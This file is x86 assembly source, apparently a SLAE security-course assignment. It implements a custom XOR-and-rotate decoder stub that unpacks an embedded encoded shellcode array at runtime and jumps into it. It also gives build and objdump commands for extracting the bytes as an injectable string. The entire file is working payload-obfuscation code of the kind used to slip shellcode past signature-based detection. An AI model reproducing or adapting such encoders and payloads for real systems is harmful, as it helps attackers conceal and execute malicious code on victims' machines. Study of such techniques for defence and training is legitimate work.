; Filename:      decoder.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  05.12.2018
; Note:          x86 code but assembled and linked on x64 (fix: -N to linker and 7 columns to objdump)
; Assembler:     nasm -f elf32 decoder.nasm -o decoder.o
; Linker:        ld -N -m elf_i386 decoder.o -o decoder
; Assembly dump: objdump -d ./decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'


global _start

section .text

_start:

	jmp short call_decoder            ; jmp-call-pop

decoder:

	pop esi                           ; Load shellcode address
	xor edi, edi                      ; Clear edi register (Value + Seed counter +2 )
	xor eax, eax                      ; Clear eax register (Write counter +1)
	xor ebx, ebx                      ; Clear ebx register
	xor edx, edx                      ; Clear edx register

decode:

	mov bl, byte [esi + edi]          ; Load new value in bl
	mov dl, byte [esi + edi + 1]      ; Load new seed in dl
	xor bl, dl                        ; XOR Decoder
	jz short shellcode                ; Check if end of shellcode (2 x 0xbb)
	mov cl, dl                        ; Add number of bit rotations in CL (seed)
	ror bl, cl                        ; Rotate right the number of bits

	mov byte [esi + eax], bl          ; Write value from bl to stack
	add edi, 2                        ; Increment counter by 2
	inc eax	                          ; Increment counter by 1
	jmp short decode                  ; Jump to decode next value

call_decoder:
	call decoder
	shellcode: db 0xc6,0x02,0x80,0x01,0x81,0x03,0xd1,0x01,0xbe,0x02,0x5f,0x01,0x98,0x03,0x1c,0x06,0x60,0x08,0xf6,0x04,0xc5,0x01,0x92,0x04,0x30,0x07,0x64,0x06,0x3a,0x04,0x58,0x08,0x4f,0x03,0x59,0x05,0xd2,0x06,0x81,0x08,0x1a,0x04,0x5f,0x07,0x03,0x08,0xd8,0x04,0x0c,0x04, 0xbb, 0xbb
